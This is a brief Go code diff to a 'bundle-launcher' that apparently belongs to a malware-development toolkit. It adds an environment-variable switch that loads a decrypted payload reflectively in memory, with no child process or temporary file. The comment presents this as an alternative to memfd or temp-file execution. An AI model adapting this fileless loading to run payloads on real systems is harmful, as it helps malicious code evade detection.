@@ -88,7 +88,16 @@ func main() {
 		os.Exit(1)
 	}
 
-	if err := executePayload(plain, os.Args[1:]); err != nil {
+	dispatch := executePayload
+	if os.Getenv("MALDEV_REFLECTIVE") == "1" {
+		// In-process reflective load — no fork, no temp file, no
+		// child process. Linux: maps the payload via
+		// pe/packer/runtime + jumps to entry. Non-Linux: stub
+		// returns ErrNotImplemented; caller can re-run without the
+		// env var to fall back to memfd/temp+exec.
+		dispatch = executePayloadReflective
+	}
+	if err := dispatch(plain, os.Args[1:]); err != nil {
 		fmt.Fprintln(os.Stderr, "bundle-launcher: exec:", err)
 		os.Exit(1)
 	}
